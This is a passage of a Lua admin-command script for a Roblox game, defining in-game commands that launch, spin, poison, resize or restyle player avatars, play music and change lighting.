set.MakeCommand('Send the target player(s) to the moon!',-1,set.Prefix,{'rocket','firework'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
if v.Character and v.Character:FindFirstChild("Torso") then
delay(0,function()
local speed = 10
local Part = Instance.new("Part")
Part.Parent = v.Character
local SpecialMesh = Instance.new("SpecialMesh") 
SpecialMesh.Parent = Part
SpecialMesh.MeshId = "http://www.unixfr.xyz/asset/?id=2251534" 
SpecialMesh.MeshType = "FileMesh" 
SpecialMesh.TextureId = "43abb6d081e0fbc8666fc92f6ff378c1" 
SpecialMesh.Scale = Vector3.new(0.5,0.5,0.5)
local Weld = Instance.new("Weld")
Weld.Parent = Part
Weld.Part0 = Part
Weld.Part1 = v.Character.Torso
Weld.C0 = CFrame.new(0,-1,0)*CFrame.Angles(-1.5,0,0)
local BodyVelocity = Instance.new("BodyVelocity")
BodyVelocity.Parent = Part
BodyVelocity.maxForce = Vector3.new(math.huge,math.huge,math.huge)
BodyVelocity.velocity = Vector3.new(0,10*speed,0)
delay(0,function()
for i = 1,math.huge do
local Explosion = Instance.new("Explosion")
Explosion.Parent = Part
Explosion.BlastRadius = 0
Explosion.Position = Part.Position + Vector3.new(0,0,0)
wait()
end 
end)        
wait(3)
pcall(function()
BodyVelocity:remove()
Instance.new("Explosion",workspace).Position=v.Character.Torso.Position
v.Character:BreakJoints()
end)
end)
end
end)()
end
end)

set.MakeCommand('Make the target player(s) dance',-1,set.Prefix,{'dance'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	set.Remote(v,'Function','Effect','dance')
end
end)

set.MakeCommand('Make the target player(s) break dance',-1,set.Prefix,{'breakdance','fundance','lolwut'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
local color
local num=math.random(1,7)
if num==1 then
color='Really blue'
elseif num==2 then
color='Really red'
elseif num==3 then
color='Magenta'
elseif num==4 then
color='Lime green'
elseif num==5 then
color='Hot pink'
elseif num==6 then
color='New Yeller'
elseif num==7 then
color='White'
end
local hum=v.Character:FindFirstChild('Humanoid')
if not hum then return end
set.Remote(v,'Function','Effect','dance')
set.ProcessCommand(plr,set.Prefix.."batch"..set.SplitKey..set.Prefix.."sparkles"..set.SplitKey..v.Name..set.SplitKey..color..set.BatchSplit..set.Prefix.."fire"..set.SplitKey..v.Name..set.SplitKey..color..set.BatchSplit..set.Prefix.."nograv"..set.SplitKey..v.Name..set.BatchSplit..set.Prefix.."smoke"..set.SplitKey..v.Name..set.SplitKey..color..set.BatchSplit..set.Prefix.."spin"..set.SplitKey..v.Name)
repeat hum.PlatformStand=true wait() until not hum or hum==nil or hum.Parent==nil
end)()
end
end)

set.MakeCommand('Make the target player(s) puke',-1,set.Prefix,{'puke','barf','throwup','vomit'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1])) do
coroutine.wrap(function()
if (not v:IsA('Player')) or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head')) or v.Character:FindFirstChild('Kohls Puke') then return end
local run=true
local k=Instance.new('StringValue',v.Character)
k.Name='Kohls Puke'
coroutine.wrap(function()
repeat 
wait(0.15)
local p = Instance.new("Part",v.Character)
p.CanCollide = false
local color = math.random(1, 3)
local bcolor
if color == 1 then
bcolor = BrickColor.new(192)
elseif color == 2 then
bcolor = BrickColor.new(28)
elseif color == 3 then
bcolor = BrickColor.new(105)
end
p.BrickColor = bcolor
local m=Instance.new('BlockMesh',p)
p.Size=Vector3.new(0.1,0.1,0.1)
m.Scale = Vector3.new(math.random()*0.9, math.random()*0.9, math.random()*0.9)
p.Locked = true
p.TopSurface = "Smooth"
p.BottomSurface = "Smooth"
p.CFrame = v.Character.Head.CFrame * CFrame.new(Vector3.new(0, 0, -1))
p.Velocity = v.Character.Head.CFrame.lookVector * 20 + Vector3.new(math.random(-5, 5), math.random(-5, 5), math.random(-5, 5))
p.Anchored = false
m.Name='Puke Peice'
p.Name='Puke Peice'
p.Touched:connect(function(o)
if o and p and (not game:service('Players'):FindFirstChild(o.Parent.Name)) and o.Name~='Puke Peice' and o.Name~='Blood Peice' and o.Name~='Blood Plate' and o.Name~='Puke Plate' and (o.Parent.Name=='Workspace' or o.Parent:IsA('Model')) and (o.Parent~=p.Parent) and o:IsA('Part') and (o.Parent.Name~=v.Character.Name) and (not o.Parent:IsA('Hat')) and (not o.Parent:IsA('Tool')) then
	local cf=CFrame.new(p.CFrame.X,o.CFrame.Y+o.Size.Y/2,p.CFrame.Z)
	p:Destroy()
	local g=Instance.new('Part',workspace)
	g.Anchored=true
	g.CanCollide=false
	g.Size=Vector3.new(0.1,0.1,0.1)
	g.Name='Puke Plate'
	g.CFrame=cf
	g.BrickColor=BrickColor.new(119)
	local c=Instance.new('CylinderMesh',g)
	c.Scale=Vector3.new(1,0.2,1)
	c.Name='PukeMesh'
	wait(10)
	g:Destroy()
elseif o and o.Name=='Puke Plate' and p then 
	p:Destroy() 
	o.PukeMesh.Scale=o.PukeMesh.Scale+Vector3.new(0.5,0,0.5)
end
end)
until run==false or not k or not k.Parent or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head'))
end)()
wait(10)
run=false
k:Destroy()
end)()
end
end)

set.MakeCommand('Make the target player(s) bleed',-1,set.Prefix,{'cut','stab','shank'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
if (not v:IsA('Player')) or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head')) or v.Character:FindFirstChild('Kohls Bleed') then return end
local run=true
local k=Instance.new('StringValue',v.Character)
k.Name='Kohls Bleed'
coroutine.wrap(function()
repeat 
wait(0.15)
v.Character.Humanoid.Health=v.Character.Humanoid.Health-1
local p = Instance.new("Part",v.Character)
p.CanCollide = false
local color = math.random(1, 3)
local bcolo
if color == 1 then
bcolor = BrickColor.new(21)
elseif color == 2 then
bcolor = BrickColor.new(1004)
elseif color == 3 then
bcolor = BrickColor.new(21)
end
p.BrickColor = bcolor
local m=Instance.new('BlockMesh',p)
p.Size=Vector3.new(0.1,0.1,0.1)
m.Scale = Vector3.new(math.random()*0.9, math.random()*0.9, math.random()*0.9)
p.Locked = true
p.TopSurface = "Smooth"
p.BottomSurface = "Smooth"
p.CFrame = v.Character.Torso.CFrame * CFrame.new(Vector3.new(2, 0, 0))
p.Velocity = v.Character.Head.CFrame.lookVector * 1 + Vector3.new(math.random(-1, 1), math.random(-1, 1), math.random(-1, 1))
p.Anchored = false
m.Name='Blood Peice'
p.Name='Blood Peice'
p.Touched:connect(function(o)
if o and p and (not game:service('Players'):FindFirstChild(o.Parent.Name)) and o.Name~='Blood Peice' and o.Name~='Puke Peice' and o.Name~='Puke Plate' and o.Name~='Blood Plate' and (o.Parent.Name=='Workspace' or o.Parent:IsA('Model')) and (o.Parent~=p.Parent) and o:IsA('Part') and (o.Parent.Name~=v.Character.Name) and (not o.Parent:IsA('Hat')) and (not o.Parent:IsA('Tool')) then
	local cf=CFrame.new(p.CFrame.X,o.CFrame.Y+o.Size.Y/2,p.CFrame.Z)
	p:Destroy()
	local g=Instance.new('Part',workspace)
	g.Anchored=true
	g.CanCollide=false
	g.Size=Vector3.new(0.1,0.1,0.1)
	g.Name='Blood Plate'
	g.CFrame=cf
	g.BrickColor=BrickColor.new(21)
	local c=Instance.new('CylinderMesh',g)
	c.Scale=Vector3.new(1,0.2,1)
	c.Name='BloodMesh'
	wait(10)
	g:Destroy()
elseif o and o.Name=='Blood Plate' and p then 
	p:Destroy() 
	o.BloodMesh.Scale=o.BloodMesh.Scale+Vector3.new(0.5,0,0.5)
end
end)
until run==false or not k or not k.Parent or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head'))
end)()
wait(10)
run=false
k:Destroy()
end)()
end
end)

set.MakeCommand('Shows you the number of player points left in the game',5,set.Prefix,{'points','getpoints'},{},0,function(plr,args)
	set.Hint('Available Player Points: '..game:GetService("PointsService"):GetAwardablePoints(),{plr})
end)

set.MakeCommand('Lets you give <player> <amount> player points',5,set.Prefix,{'givepoints','sendpoints'},{'player','amount'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
		local ran,failed=ypcall(function() game:GetService("PointsService"):AwardPoints(v.userId,tonumber(args[2])) end)
		if ran and game:GetService("PointsService"):GetAwardablePoints()>=tonumber(args[2]) then
			set.Hint('Gave '..args[2]..' points to '..v.Name,{plr})
		elseif game:GetService("PointsService"):GetAwardablePoints()<tonumber(args[2])then
			set.Hint("You don't have "..args[2]..' points to give to '..v.Name,{plr})
		else
			set.Hint("(Unknown Error) Failed to give "..args[2]..' points to '..v.Name,{plr})
		end
		set.Hint('Available Player Points: '..game:GetService("PointsService"):GetAwardablePoints(),{plr})
	end
end)

set.MakeCommand('Slowly kills the target player(s)',-1,set.Prefix,{'poison'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
		local torso=v.Character:FindFirstChild('Torso')
		local larm=v.Character:FindFirstChild('Left Arm')
		local rarm=v.Character:FindFirstChild('Right Arm')
		local lleg=v.Character:FindFirstChild('Left Leg')
		local rleg=v.Character:FindFirstChild('Right Leg')
		local head=v.Character:FindFirstChild('Head')
		local hum=v.Character:FindFirstChild('Humanoid')
		if torso and larm and rarm and lleg and rleg and head and hum and not v.Character:FindFirstChild('KohlsPoisoned') then
			local poisoned=Instance.new('BoolValue',v.Character)
			poisoned.Name='KohlsPoisoned'
			poisoned.Value=true
			local tor=torso.BrickColor
			local lar=larm.BrickColor
			local rar=rarm.BrickColor
			local lle=lleg.BrickColor
			local rle=rleg.BrickColor
			local hea=head.BrickColor
			torso.BrickColor=BrickColor.new('Br. yellowish green')
			larm.BrickColor=BrickColor.new('Br. yellowish green')
			rarm.BrickColor=BrickColor.new('Br. yellowish green')
			lleg.BrickColor=BrickColor.new('Br. yellowish green')
			rleg.BrickColor=BrickColor.new('Br. yellowish green')
			head.BrickColor=BrickColor.new('Br. yellowish green')
			local run=true
			coroutine.wrap(function() wait(10) run=false end)()
			repeat
				wait(1)
				hum.Health=hum.Health-5
			until (not poisoned) or (not poisoned.Parent) or (not run)
			if poisoned and poisoned.Parent then
				torso.BrickColor=tor
				larm.BrickColor=lar
				rarm.BrickColor=rar
				lleg.BrickColor=lle
				rleg.BrickColor=rle
				head.BrickColor=hea
			end
		end
	end
end)

set.MakeCommand('Makes the target player(s) say interesting things, makes it hard for them to walk, and eventually kills them',-1,set.Prefix,{'drug','intoxicate'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
		set.Remote(v,'Function','Drug')
	end
end)

set.MakeCommand('Change the pitch o the currently playing song',2,set.Prefix,{'pitch'},{'number'},1,function(plr,args)
coroutine.wrap(function()
local pitch = args[1]
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v.Pitch=pitch end end
end)()
end)

set.MakeCommand('Start playing a song',2,set.Prefix,{'music','song','playsong'},{'id'},1,function(plr,args)
coroutine.wrap(function()
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
local id = args[1]:lower()
local pitch = 1
local mp = game:service('MarketplaceService')
local volume = 1
for i,v in pairs(set['MusicList']) do if id==v.Name:lower() then id=v.Id if v.Pitch then pitch=v.Pitch end if v.Volume then volume=v.Volume end end end
local name = 'Invalid ID '
pcall(function() if mp:GetProductInfo(id).AssetTypeId==3 then name = 'Now playing '..mp:GetProductInfo(id).Name end end)
local s = Instance.new("Sound") 
s.Name='Sound'..set.RemoteObject
s.Parent=workspace
s.SoundId = "http://www.unixfr.xyz/asset/?id=" .. id 
s.Volume = volume 
s.Pitch = pitch 
s.Looped = true 
s.archivable = false
pcall(function() s:Play()end)
set.Hint(name..' ('..id..')',game:service('Players'):children())
end)()
end)

set.MakeCommand('Stop the currently playing song',2,set.Prefix,{'stopmusic','musicoff'},{},0,function(plr,args)
for i, v in pairs(game.Workspace:children()) do if v:IsA("Sound") then v:Destroy() end end
end)

set.MakeCommand('Shows you the script\'s available music list',2,set.Prefix,{'musiclist','listmusic','songs'},{},0,function(plr,args)
local listforclient={}
for i, v in pairs(set['MusicList']) do 
table.insert(listforclient,v.Name)
end
--set.Remote(plr,'SetSetting','MusicList',listforclient)
set.Remote(plr,'Function','ListGui','Music List',listforclient)
end)

set.MakeCommand('Turns the target player(s) into a stick figure',-1,set.Prefix,{'stickify','stick','stickman'},{'player'},1,function(plr,args)
	local plrz = set.GetPlayers(plr, args[1]:lower())
	for kay, player in pairs(plrz) do
	coroutine.wrap(function()
	local m = player.Character
	for i,v in pairs(m:GetChildren()) do
	if v:IsA ("Part") then
	local s = Instance.new("SelectionPartLasso")
	s.Parent = m.Torso
	s.Part = v
	s.Humanoid = m.Humanoid
	s.Color = BrickColor.new(0,0,0)
	v.Transparency = 1
	m.Head.Transparency = 0
	m.Head.Mesh:Remove()
	local b = Instance.new("SpecialMesh")
	b.Parent = m.Head
	b.MeshType = "Sphere"
	b.Scale = Vector3.new(.5,1,1)
	m.Head.BrickColor = BrickColor.new("Black")
	end 
	end
	end)()
	end 
end)

set.MakeCommand('Sends the target player(s) down a hole',-1,set.Prefix,{'hole','sparta'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for kay, player in pairs(plrz) do
coroutine.wrap(function()
local torso=player.Character:FindFirstChild('Torso')
if torso then
local hole = Instance.new("Part",player.Character)
hole.Anchored = true
hole.CanCollide = false
hole.formFactor = Enum.FormFactor.Custom
hole.Size = Vector3.new(10,1,10)
hole.CFrame = torso.CFrame * CFrame.new(0,-3.3,-3)
hole.BrickColor = BrickColor.new("Really black")
local holeM = Instance.new("CylinderMesh",hole)
torso.Anchored = true
local foot = torso.CFrame * CFrame.new(0,-3,0)
for i=1,10 do
torso.CFrame = foot * CFrame.fromEulerAnglesXYZ(-(math.pi/2)*i/10,0,0) * CFrame.new(0,3,0)
wait()
end
for i=1,5,0.2 do
torso.CFrame = foot * CFrame.new(0,-(i^2),0) * CFrame.fromEulerAnglesXYZ(-(math.pi/2),0,0) * CFrame.new(0,3,0)
wait()
end
player.Character.Humanoid.Health=0
end
end)()
end
end)

set.MakeCommand('Crucifies the target players(s) (Old Roman punishment done to thousands of people, saying its offensive only means you are ignorant)',-1,set.Prefix,{'crucify','cross'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
		local torso=v.Character['Torso']
		local larm=v.Character['Left Arm']
		local rarm=v.Character['Right Arm']
		local lleg=v.Character['Left Leg']
		local rleg=v.Character['Right Leg']
		local head=v.Character['Head']
		if torso and larm and rarm and lleg and rleg and head and not v.Character:FindFirstChild(v.Name..'kohlscrusify') then
			local cru=Instance.new('Model',v.Character)
			cru.Name=v.Name..'kohlscrusify'
			local c1=Instance.new('Part',cru)
			c1.BrickColor=BrickColor.new('Reddish brown')
			c1.Material='Wood'
			c1.CFrame=(v.Character.Torso.CFrame-v.Character.Torso.CFrame.lookVector)*CFrame.new(0,0,2)
			c1.Size=Vector3.new(2,18.4,1)
			c1.Anchored=true
			local c2=c1:Clone()
			c2.Parent=cru
			c2.Size=Vector3.new(11,1.6,1)
			c2.CFrame=c1.CFrame+Vector3.new(0,5,0)
			torso.Anchored=true
			wait(0.5)
			torso.CFrame=c2.CFrame+torso.CFrame.lookVector+Vector3.new(0,-1,0)
			wait(0.5)
			larm.Anchored=true
			rarm.Anchored=true
			lleg.Anchored=true
			rleg.Anchored=true
			head.Anchored=true
			wait()
			larm.CFrame=torso.CFrame*CFrame.new(-1.5,1,0)
			rarm.CFrame=torso.CFrame*CFrame.new(1.5,1,0)
			lleg.CFrame=torso.CFrame*CFrame.new(-0.1,-1.7,0)
			rleg.CFrame=torso.CFrame*CFrame.new(0.1,-1.7,0)
			larm.CFrame=larm.CFrame*CFrame.Angles(0,0,-140)
			rarm.CFrame=rarm.CFrame*CFrame.Angles(0,0,140)
			lleg.CFrame=lleg.CFrame*CFrame.Angles(0,0,0.6)
			rleg.CFrame=rleg.CFrame*CFrame.Angles(0,0,-0.6)
			--head.CFrame=head.CFrame*CFrame.Angles(0,0,0.3)
			local n1=Instance.new('Part',cru)
			n1.BrickColor=BrickColor.new('Dark stone grey')
			n1.Material='DiamondPlate'
			n1.Size=Vector3.new(0.2,0.2,2)
			n1.Anchored=true
			local m=Instance.new('BlockMesh',n1)
			m.Scale=Vector3.new(0.2,0.2,0.7)
			n2=n1:clone()
			n2.Parent=cru
			n3=n1:clone()
			n3.Parent=cru
			n1.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(2,0,0)
			n2.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(-2,0,0)
			n3.CFrame=(c2.CFrame+torso.CFrame.lookVector)*CFrame.new(0,-3,0)
			coroutine.wrap(function()
				repeat 
					wait(0.1)
					v.Character.Humanoid.Health=v.Character.Humanoid.Health-0.6
					local p = Instance.new("Part",v.Character)
					p.CanCollide = false
					local color = math.random(1, 3)
					local bcolo
					if color == 1 then
						bcolor = BrickColor.new(21)
						parent=n1
					elseif color == 2 then
						bcolor = BrickColor.new(1004)
						parent=n2
					elseif color == 3 then
						bcolor = BrickColor.new(21)
						parent=n3
					end
					p.BrickColor = bcolor
					local m=Instance.new('BlockMesh',p)
					p.Size=Vector3.new(0.1,0.1,0.1)
					m.Scale = Vector3.new(math.random()*0.9, math.random()*0.9, math.random()*0.9)
					p.Locked = true
					p.TopSurface = "Smooth"
					p.BottomSurface = "Smooth"
					p.CFrame = parent.CFrame
					p.Anchored = false
					m.Name='Blood Peice'
					p.Name='Blood Peice'
					p.Touched:connect(function(o)
						if o and p and o~=parent and o~=n1 and o~=n2 and o~=n3 and o~=c1 and o~=c2 and o.Parent~=cru and (not game:service('Players'):FindFirstChild(o.Parent.Name)) and o.Name~='Blood Peice' and o.Name~='Puke Peice' and o.Name~='Puke Plate' and o.Name~='Blood Plate' and (o.Parent.Name=='Workspace' or o.Parent:IsA('Model')) and (o.Parent~=p.Parent) and o:IsA('Part') and (o.Parent.Name~=v.Character.Name) and (not o.Parent:IsA('Hat')) and (not o.Parent:IsA('Tool')) then
							local cf=CFrame.new(p.CFrame.X,o.CFrame.Y+o.Size.Y/2,p.CFrame.Z)
							p:Destroy()
							local g=Instance.new('Part',workspace)
							g.Anchored=true
							g.CanCollide=false
							g.Size=Vector3.new(0.1,0.1,0.1)
							g.Name='Blood Plate'
							g.CFrame=cf
							g.BrickColor=BrickColor.new(21)
							local c=Instance.new('CylinderMesh',g)
							c.Scale=Vector3.new(1,0.2,1)
							c.Name='BloodMesh'
							wait(10)
							g:Destroy()
						elseif o and o.Name=='Blood Plate' and p then 
							p:Destroy() 
							o.BloodMesh.Scale=o.BloodMesh.Scale+Vector3.new(1,0,1)
						end
					end)
				until (not cru) or (not cru.Parent) or (not v) or (not v.Character) or (not v.Character:FindFirstChild('Head')) or v.Character.Humanoid.Health<=0
			end)()
		end
	end
end)

set.MakeCommand('Lets the target player(s) fly',2,set.Prefix,{'fly','flight'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
	set.Remote(v,'Function','Effect','fly')
end
end)

set.MakeCommand('Removes the target player(s)\'s ability to fly',2,set.Prefix,{'unfly','ground'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
	set.Remote(v,'Function','Effect','unfly')
end
end)

set.MakeCommand('Turns the place into a disco party',-1,set.Prefix,{'disco'},{},0,function(plr,args)
set.lighttask=false
wait(0.5)
coroutine.wrap(function()
set.lighttask = true
repeat
if set.lighttask==false then return end
local color = Color3.new(math.random(255)/255,math.random(255)/255,math.random(255)/255)
game:service('Lighting').Ambient = color
game:service('Lighting').OutdoorAmbient = color
game:service('Lighting').FogColor = color
wait(0.1)
until set.lighttask==false
end)()
end)

set.MakeCommand('Makes the place flash',-1,set.Prefix,{'flash'},{},0,function(plr,args)
set.lighttask=false
wait(0.5)
coroutine.wrap(function()
set.lighttask=true
repeat
if set.lighttask==false then return end
game:service('Lighting').Ambient = Color3.new(1,1,1)
game:service('Lighting').OutdoorAmbient = Color3.new(1,1,1)
game:service('Lighting').FogColor = Color3.new(1,1,1)
game:service('Lighting').Brightness = 1
game:service('Lighting').TimeOfDay = 14
wait(0.1) 
game:service('Lighting').Ambient = Color3.new(0,0,0)
game:service('Lighting').OutdoorAmbient = Color3.new(0,0,0)
game:service('Lighting').FogColor = Color3.new(0,0,0)
game:service('Lighting').Brightness = 0
game:service('Lighting').TimeOfDay = 0
wait(0.1)
until set.lighttask==false
end)()
end)

set.MakeCommand('Makes the target player(s) spin',-1,set.Prefix,{'spin'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for i,v in pairs(v.Character.Torso:children()) do if v.Name == "SPINNER" then v:Destroy() end end
local torso = v.Character:findFirstChild("Torso")
local bg = Instance.new("BodyGyro", torso) bg.Name = "SPINNER" bg.maxTorque = Vector3.new(0,math.huge,0) bg.P = 11111 bg.cframe = torso.CFrame table.insert(set.objects,bg)
repeat wait(1/44) bg.cframe = bg.cframe * CFrame.Angles(0,math.rad(30),0)
until not bg or bg.Parent ~= torso
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) stop spinning',-1,set.Prefix,{'unspin'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
for a,q in pairs(v.Character.Torso:children()) do if q.Name == "SPINNER" then q:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) into a dog',-1,set.Prefix,{'dog','dogify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 1
v.Character.Torso.Neck.C0 = CFrame.new(0,-.5,-2) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-.5,-1.5,-1.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1.5,-1,1.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1.5,-1,1.5) * CFrame.Angles(0,math.rad(-90),0)
local new = Instance.new("Seat", v.Character) new.Name = "FAKETORSO" new.formFactor = "Symmetric" new.TopSurface = 0 new.BottomSurface = 0 new.Size = Vector3.new(3,1,4) new.CFrame = v.Character.Torso.CFrame
local bf = Instance.new("BodyForce", new) bf.force = Vector3.new(0,new:GetMass()*196.25,0)
local weld = Instance.new("Weld", v.Character.Torso) weld.Part0 = v.Character.Torso weld.Part1 = new weld.C0 = CFrame.new(0,-.5,0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Brown") elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Brown") end end
end
end)()
end
end)

set.MakeCommand('Turn them back to normal',-1,set.Prefix,{'undog','undogify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) into a creeper',-1,set.Prefix,{'creeper','creeperify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(0,-1.5,-.5) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(0,-1,.5) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("Bright green") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("Bright green") end end
end
end)()
end
end)

set.MakeCommand('Turn the target player(s) back to normal',-1,set.Prefix,{'uncreeper','uncreeperify'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end)()
end
end)

set.MakeCommand('Give the target player(s) a larger ego',-1,set.Prefix,{'bighead'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v.Character.Head.Mesh.Scale = Vector3.new(3,3,3) v.Character.Torso.Neck.C0 = CFrame.new(0,1.9,0) * CFrame.Angles(math.rad(90),math.rad(180),0) end
end)()
end
end)

set.MakeCommand('Resize the target player(s)\'s character by <number>',-1,set.Prefix,{'resize','size'},{'player','number'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
	 if not (v and v.Character and v.Character:findFirstChild('Torso') and v.Character:findFirstChild('HumanoidRootPart')) then return end
		local ags = {c = v.Character, t = v.Character.Torso, r = v.Character.HumanoidRootPart}
		ags.t.Anchored = true ags.t.BottomSurface = 0 ags.t.TopSurface = 0
		local welds = {} --Credit to Drezmor for the orig command, credit to Kohltastrophe for making it work correctly l0l
		for i2,v2 in pairs(ags.c:children()) do
		if v2:IsA('BasePart') then v2.Anchored = true
		elseif v2:IsA('Pants') or v2:IsA('Shirt') then v2.Parent = ags.t
		end
		end
		print(args[2])
		local function size(p)
		for i2,v2 in pairs(p:children()) do
		if v2:IsA('Weld') or v2:IsA('Motor') or v2:IsA('Motor6D') then
		local p1 = v2.Part1 p1.Anchored = true v2.Part1 = nil
		local r1,r2,r3,r4,r5,r6,r7,r8,r9,r10,r11,r12 = v2.C0:components() v2.C0 = CFrame.new(r1*args[2],r2*args[2],r3*args[2],r4,r5,r6,r7,r8,r9,r10,r11,r12)
		local r1,r2,r3,r4,r5,r6,r7,r8,r9,r10,r11,r12 = v2.C1:components() v2.C1 = CFrame.new(r1*args[2],r2*args[2],r3*args[2],r4,r5,r6,r7,r8,r9,r10,r11,r12)
		if p1.Name ~= 'Head' and p1.Name ~= 'Torso' then
		p1.formFactor = 3
		p1.Size = p1.Size*args[2]
		elseif p1.Name ~= 'Torso' then
		p1.Anchored = true
		for i3,v3 in pairs(p1:children()) do if v3:IsA('Weld') then v3.Part0 = nil v3.Part1.Anchored = true end end
